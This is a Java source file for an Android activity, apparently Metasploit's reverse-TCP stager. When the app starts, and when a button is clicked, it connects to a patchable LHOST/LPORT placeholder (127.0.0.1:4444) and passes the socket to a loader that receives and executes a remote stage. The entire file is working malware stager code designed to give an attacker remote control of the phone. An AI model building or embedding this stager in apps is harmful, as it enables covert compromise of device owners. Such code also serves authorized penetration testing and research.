package com.metasploit.stage;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;

public class MainActivity extends Activity
{
    // avoid re-ordering the strings in classes.dex - append XXXX
    private static final String LHOST = "XXXX127.0.0.1                       ";
    private static final String LPORT = "YYYY4444                            ";
	
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        findViewById(R.id.button_reverse).setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                startAsync();
            }
        });

        startAsync();
    }

    private void startAsync() {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                reverseTCP();
                return null;
            }
        }.execute();
    }

    private void reverseTCP() {
        try {
            String lhost = LHOST.substring(4).trim();
            String lport = LPORT.substring(4).trim();
            Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
            DataInputStream in = new DataInputStream(msgsock.getInputStream());
            OutputStream out = new DataOutputStream(msgsock.getOutputStream());
            new LoadStage().start(in, out, this, new String[] {});
            msgsock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
